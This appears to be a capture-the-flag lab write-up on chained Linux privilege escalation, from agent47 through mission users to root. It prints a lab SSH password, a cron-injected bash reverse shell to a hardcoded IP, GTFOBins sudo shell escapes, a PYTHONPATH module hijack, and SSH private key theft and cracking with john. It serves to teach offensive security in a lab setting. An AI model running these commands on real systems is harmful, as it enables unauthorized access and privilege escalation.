# LinuxAgency
Linux Agency Lab - using find, grep, sudo, ssh, cron, GTFOBins (zip, git, less, vim), python, and TTY stabilization (script, stty, export TERM) for user enumeration and privilege escalation.

By Ramyar Daneshgar 

This lab followed a structured, multi-user Linux escalation scenario requiring a combination of enumeration, file system inspection, encoding analysis, local privilege escalation (LPE) techniques, and abuse of misconfigured sudo rules. Starting from low-privileged access (`agent47`), I enumerated users and escalated through 30 chained accounts, culminating in root access. Each stage required deep familiarity with Linux internals, privilege boundaries, TTY manipulation, and controlled abuse of system-level tools and scripts.

---

## Initial Foothold: SSH Access as `agent47`

I authenticated via SSH:

```bash
ssh agent47@10.10.188.218
# Password: 640509040147
```

The objective was clear: locate user-specific flags embedded across the file system using Linux primitives and use each flag as a credential to laterally move to the next user (`mission1` → `mission30`).

---

## User Enumeration Chain (`agent47` → `mission30`)

### Recon and Local Enumeration

I used recursive search tools to locate flags via:

- `find / -type f -name "flag.txt" 2>/dev/null` — for plaintext flag files
- `grep -r "missionX" / 2>/dev/null` — for hidden or embedded flag strings
- `grep -r missionX * .[^.]* 2>/dev/null` — to uncover flags inside hidden dotfiles

Example:

```bash
grep -r mission1 * .[^.]* 2>/dev/null
```

Output:

```bash
mission1{17********************f0}
```

Followed by:

```bash
su mission1
# Password: mission1{...}
```

I repeated this for each mission user. In some cases, the flags were embedded in binaries (e.g., ELF executables), encoded in hex, base64, or obfuscated using XOR logic.

---

## Highlighted Technical Scenarios

### Binary Decoding – Hex, Base64, XOR

- **Hex Decoding**:
  ```bash
  echo <hex_string> | xxd -r -p
  ```

- **XOR Deobfuscation**:
  ```python
  flag = "<xor_encoded_flag>"
  for i in range(len(flag)):
      flag = flag[:i] + chr(ord(flag[i]) ^ ord("S")) + flag[i+1:]
      print(flag[i], end="")
  ```

- **ELF Binary Inspection**:
  ```bash
  strings mission17.elf
  chmod +x mission17.elf && ./mission17.elf
  ```

These steps reinforced the need to recognize binary headers and know how to reverse basic encoding/obfuscation mechanisms in CTFs and malware analysis.

---

### TTY Shell Stabilization for Interactive Sessions

To enhance shell usability for local LPE attempts, I chained together:

```bash
script -qc /bin/bash /dev/null
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

This gave me access to line editing, tab completion, and process control—critical when working inside constrained shells.

---

## Privilege Escalation Techniques (Post-mission30)

### Cronjob Injection – `dalia`

Found a world-writable script (`47.sh`) executed via `crontab` every minute:

```bash
echo 'bash -i >& /dev/tcp/10.2.12.26/4444 0>&1' > /path/to/47.sh
nc -lvnp 4444
```

The shell returned within 30 seconds. This demonstrated time-sensitive command injection into persistent root-owned automation.

---

### Sudo Misconfigurations + GTFOBins

**Abused binaries permitted via `sudo` without password:**

- **zip (silvio)**:
  ```bash
  TF=$(mktemp -u)
  sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
  ```

- **git + PAGER (reza)**:
  ```bash
  sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p
  ```

  Then spawned an interactive shell:
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  ```

- **vim (sean)**:
  ```bash
  sudo -u sean vim -c ':!/bin/sh'
  ```

- **less (ken)**:
  ```bash
  sudo -u ken less /etc/profile
  ```

  Then executed `!/bin/sh` within the pager.

- **base64 (maya)**:
  Encoded a payload and decoded it inline using:
  ```bash
  echo <base64 payload> | sudo -u maya base64 -d | bash
  ```

GTFOBins was essential in quickly identifying how each binary could be hijacked for shell escape under elevated permissions.

---

### Python Module Hijack – `jordan`

A misconfigured script (`/opt/scripts/Gun-Shop.py`) imported a nonexistent module. I created a malicious Python package:

```bash
mkdir -p /tmp/shop
echo 'import os; os.system("/bin/bash")' > /tmp/shop/__init__.py
sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
```

This exploited an import path vulnerability to execute arbitrary code with `jordan`’s privileges.

---

### SSH Private Key Cracking – `robert`

I located a private key under `.ssh` and exfiltrated it:

```bash
scp agent47@<ip>:/home/robert/.ssh/id_rsa .
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Brute-forced the passphrase using John the Ripper. Gained shell access upon successful crack.

---

### Service Enumeration → Root via Bash Sudo

Discovered an SSH service on port `2222`:

```bash
ss -tulpn
```

After connecting and authenticating with a cracked credential, I checked sudo rights:

```bash
sudo -l
```

Root access was trivially granted via:

```bash
sudo bash
```

---

## Post-Exploitation: root.txt Retrieval

```bash
cat /root/root.txt
```

Root compromise confirmed.

---

## Lessons Learned (Technical Takeaways)

1. **Systematic File and Process Enumeration is Non-Negotiable**  
   Leveraged `find`, `grep`, and `strings` to discover flags, hidden binaries, and misconfigurations across user accounts.

2. **Shell Handling and TTY Control are Foundational for Exploitation**  
   Full terminal control via `stty`, `script`, and environment tuning proved essential for executing chained LPE techniques.

3. **GTFOBins is a Weaponized Reference Source**  
   Familiarity with binary-specific shell escapes under sudo context was indispensable across multiple user accounts.

4. **Path Injection & Import Hijacking are Common but Powerful Vectors**  
   Abusing `PYTHONPATH` with malicious modules allowed code execution under elevated users—a common real-world vulnerability in misconfigured development environments.

5. **Binary Analysis Enhances Flag Extraction and Vulnerability Detection**  
   Recognizing and decoding ELF binaries, XOR strings, and base64/hex content was critical in transitioning through users.

6. **Cron and Timer-based Execution are Ideal LPE Triggers**  
   Monitoring `/etc/crontab` and injecting into writable scripts timed for root execution gave elevated access with minimal effort.

7. **Credential Reuse and Weak Private Keys are Always in Play**  
   SSH key extraction and password cracking (via `ssh2john` + `john`) remain effective in lateral movement and escalation.

8. **Sudo Misconfigurations Often Lead to Full Compromise**  
   Minimal privileges (e.g., `sudo vim`, `sudo git`) must always be reviewed for escalation paths.
